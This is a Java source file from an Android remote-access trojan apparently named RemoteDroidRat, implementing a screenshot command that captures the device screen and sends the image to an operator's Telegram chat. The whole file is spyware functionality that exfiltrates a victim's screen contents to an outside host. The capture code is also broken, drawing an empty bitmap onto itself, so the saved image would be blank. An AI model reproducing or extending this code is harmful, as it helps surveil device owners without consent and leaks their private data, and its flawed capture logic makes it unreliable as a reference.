package com.KaranKumar.RemoteDroidRat.commandActions;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.DisplayMetrics;
import android.view.Surface;

import com.KaranKumar.RemoteDroidRat.adminInfo;
import com.KaranKumar.RemoteDroidRat.telegramBot.TelegramBotApi;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import android.hardware.display.DisplayManager;

public class screenshot {

    private Context context;
    private TelegramBotApi telegramBot;
    private adminInfo admin;
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private static final int REQUEST_MEDIA_PROJECTION = 1001; // Use any unique code

    public screenshot(Context context) {
        if (context != null) {
            this.context = context;
            this.telegramBot = new TelegramBotApi(context);
            this.admin = new adminInfo(context);
            this.mediaProjectionManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        } else {
            // Handle the case where context is null, log an error, or throw an exception.
        }
    }

    public void takeAndSendScreenshot(Activity activity) {
        try {
            // Create an instance of the MediaProjection class
            Intent captureIntent = mediaProjectionManager.createScreenCaptureIntent();
            // Start an activity to obtain the result
            activity.startActivityForResult(captureIntent, REQUEST_MEDIA_PROJECTION);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Call this method from onActivityResult in your activity to handle the result
    public void handleActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK) {
            // Obtain the MediaProjection instance
            mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data);

            // Now, continue with taking and sending the screenshot
            continueScreenshotProcess();
        }
    }

    private void continueScreenshotProcess() {
        try {
            // Get the display metrics to determine the dimensions of the screenshot
            DisplayMetrics metrics = context.getResources().getDisplayMetrics();
            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            // Create a virtual display using the MediaProjection
            Surface surface = mediaProjection.createVirtualDisplay("Screenshot", width, height, density, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, null, null, null).getSurface();

            // Create a bitmap to hold the screenshot
            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

            // Create a canvas to draw the screenshot into the bitmap
            Canvas canvas = new Canvas(bitmap);

            // Draw the screenshot into the bitmap using the canvas
            canvas.drawBitmap(bitmap, 0, 0, null);

            // Save the bitmap to a file
            File screenshotFile = new File(context.getFilesDir(), "screenshot.png");
            saveBitmapToFile(bitmap, screenshotFile);

            // Send the screenshot file to Telegram Bot
            sendToTelegramBot(admin.getChatId(), screenshotFile.getAbsolutePath());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void saveBitmapToFile(Bitmap bitmap, File file) {
        try {
            try (FileOutputStream fos = new FileOutputStream(file)) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendToTelegramBot(String chatId, String filePath) {
        if (isNetworkConnected()) {
            telegramBot.sendFile(chatId, filePath);
        }
    }

    private boolean isNetworkConnected() {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        return mobileNetworkInfo != null && mobileNetworkInfo.isConnected();
    }
}
